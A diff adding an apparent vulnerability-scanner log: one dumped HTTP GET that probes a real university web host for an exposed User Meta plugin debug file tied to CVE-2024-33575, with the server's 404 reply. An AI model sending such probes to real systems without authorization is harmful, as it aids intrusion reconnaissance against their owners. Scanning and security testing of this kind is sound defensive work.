@@ -1,0 +1,23 @@
+[CVE-2024-33575] Dumped HTTP request for https://must.unimelb.edu.au/wp-content/plugins/user-meta/views/debug.php
+
+
+GET /wp-content/plugins/user-meta/views/debug.php HTTP/1.1
+Host: must.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2024-33575] Dumped HTTP response https://must.unimelb.edu.au/wp-content/plugins/user-meta/views/debug.php
+
+HTTP/1.1 404 Not Found
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:10 GMT
+Server: openresty
+
+File not found.
+
